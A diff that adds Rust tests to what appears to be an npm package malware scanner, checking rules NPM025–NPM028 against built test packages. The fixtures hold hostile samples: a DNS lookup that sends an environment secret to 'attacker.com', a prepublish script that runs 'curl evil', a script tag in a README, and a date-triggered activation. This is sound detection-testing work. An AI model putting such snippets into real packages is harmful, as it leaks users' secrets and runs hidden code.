@@ -661,6 +661,100 @@ fn coinhive_library_name_is_blocked() {
 }
 
 #[test]
+fn dns_lookup_with_concat_fires_npm025() {
+    let pkg = r#"{ "name": "dnstun", "version": "0.0.1" }"#;
+    let src = r#"
+        const dns = require('dns');
+        const token = process.env.SECRET;
+        dns.lookup(token + '.attacker.com', () => {});
+    "#;
+    let bytes = build_tgz(&[
+        ("package/package.json", pkg.as_bytes()),
+        ("package/index.js", src.as_bytes()),
+    ]);
+    let s = analyze(bytes);
+    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
+    assert!(ids.contains(&"NPM025"), "expected NPM025, got {ids:?}");
+}
+
+#[test]
+fn dns_lookup_literal_is_clean_for_npm025() {
+    let pkg = r#"{ "name": "literal-dns", "version": "0.0.1" }"#;
+    let src = "require('dns').lookup('example.com', () => {});";
+    let bytes = build_tgz(&[
+        ("package/package.json", pkg.as_bytes()),
+        ("package/index.js", src.as_bytes()),
+    ]);
+    let s = analyze(bytes);
+    assert!(
+        s.findings.iter().all(|f| f.rule_id != "NPM025"),
+        "false-positive NPM025: {:?}",
+        s.findings
+    );
+}
+
+#[test]
+fn script_tag_in_readme_is_blocked() {
+    let pkg = r#"{ "name": "doc-smuggle", "version": "0.0.1" }"#;
+    let readme = b"# Hello\n\n<script>alert(1)</script>\n";
+    let bytes = build_tgz(&[
+        ("package/package.json", pkg.as_bytes()),
+        ("package/README.md", readme.as_slice()),
+    ]);
+    let s = analyze(bytes);
+    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
+    assert!(ids.contains(&"NPM026"), "expected NPM026, got {ids:?}");
+    assert_eq!(s.verdict, Stage1Verdict::Malicious);
+}
+
+#[test]
+fn publish_time_dangerous_api_fires_npm027() {
+    let pkg = r#"{
+        "name": "publish-evil",
+        "version": "0.0.1",
+        "scripts": {
+            "prepublishOnly": "node -e \"require('child_process').exec('curl evil')\""
+        }
+    }"#;
+    let bytes = build_tgz(&[("package/package.json", pkg.as_bytes())]);
+    let s = analyze(bytes);
+    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
+    assert!(ids.contains(&"NPM027"), "expected NPM027, got {ids:?}");
+}
+
+#[test]
+fn future_date_now_comparison_fires_npm028() {
+    let pkg = r#"{ "name": "ticker", "version": "0.0.1" }"#;
+    // Year-2100 ms-since-epoch — well past current time.
+    let src = "if (Date.now() > 4102444800000) { activate(); }";
+    let bytes = build_tgz(&[
+        ("package/package.json", pkg.as_bytes()),
+        ("package/index.js", src.as_bytes()),
+    ]);
+    let s = analyze(bytes);
+    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
+    assert!(ids.contains(&"NPM028"), "expected NPM028, got {ids:?}");
+}
+
+#[test]
+fn past_date_now_comparison_is_clean_for_npm028() {
+    let pkg = r#"{ "name": "history", "version": "0.0.1" }"#;
+    // Year-2000 timestamp — already in the past, common sanity-check
+    // shape (`if (Date.now() < 946684800000) throw 'clock broken';`).
+    let src = "if (Date.now() < 946684800000) { throw new Error('clock broken'); }";
+    let bytes = build_tgz(&[
+        ("package/package.json", pkg.as_bytes()),
+        ("package/index.js", src.as_bytes()),
+    ]);
+    let s = analyze(bytes);
+    assert!(
+        s.findings.iter().all(|f| f.rule_id != "NPM028"),
+        "false-positive NPM028: {:?}",
+        s.findings
+    );
+}
+
+#[test]
 fn large_base64_without_eval_is_clean() {
     let pkg = r#"{ "name": "icon-pkg", "version": "0.0.1" }"#;
     let blob: String = "A".repeat(2048);
